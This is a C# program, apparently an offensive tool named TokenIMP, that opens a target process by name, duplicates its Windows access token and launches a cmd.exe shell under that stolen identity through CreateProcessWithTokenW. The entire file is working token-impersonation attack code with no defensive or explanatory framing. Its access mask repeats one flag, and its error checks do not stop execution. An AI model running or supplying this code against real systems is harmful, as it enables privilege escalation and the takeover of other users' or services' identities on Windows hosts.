using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;

namespace TokenIMP
{

    internal class Program
    {
        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(int dwDesiredAccess,
        bool bInheritHandle, int dwProcessId);

        [DllImport("advapi32.dll")]
        public static extern bool OpenProcessToken(IntPtr ProcessHandle, UInt32 DesiredAccess, out IntPtr TokenHandle);

        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public extern static bool DuplicateTokenEx(
        IntPtr hExistingToken,
        uint dwDesiredAccess,
        IntPtr lpTokenAttributes,
        uint ImpersonationLevel,
        uint TokenType,
        out IntPtr phNewToken);

        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool CreateProcessWithTokenW(
        IntPtr hToken,
        UInt32 dwLogonFlags,
        string lpApplicationName,
        string lpCommandLine,
        UInt32 dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        [In] ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);

        static int FindTarget(string name)
        {
            int pid;
            var processes = Process.GetProcessesByName(name);
            if (processes.Length > 0)
            {
                pid = processes[0].Id;
                return pid;
            }

            Console.WriteLine("Could not able to find a process with {0}", name);
            return 0;
        }

        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine(String.Format("Send processname as first argument"));
                return;
            }

            string process_name = args[0];

            int pid = FindTarget(process_name);

            var hProcess = OpenProcess(0x0400 | 0x0040, false, pid);

            if (hProcess== IntPtr.Zero)
            {
                Console.WriteLine("Could not able open process {0}", pid);
            }

            IntPtr hToken;
            
            var hProcessToken = OpenProcessToken(hProcess, 0x0002 | 0x0002, out hToken);

            if (!hProcessToken)
            {
                Console.WriteLine("Could not able to access to token");
            }

            var dupResult = DuplicateTokenEx(hToken, 0xf01ff, IntPtr.Zero, 2, 1, out var hTokenDup);

            if (!dupResult)
            {
                Console.WriteLine("Could not able to duplicate token");
            }

            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            bool result = CreateProcessWithTokenW(hTokenDup, 0x00000001, "C:\\Windows\\system32\\cmd.exe", null, 0x00000010, IntPtr.Zero, null, ref si, out pi);

        }

        
    }
}
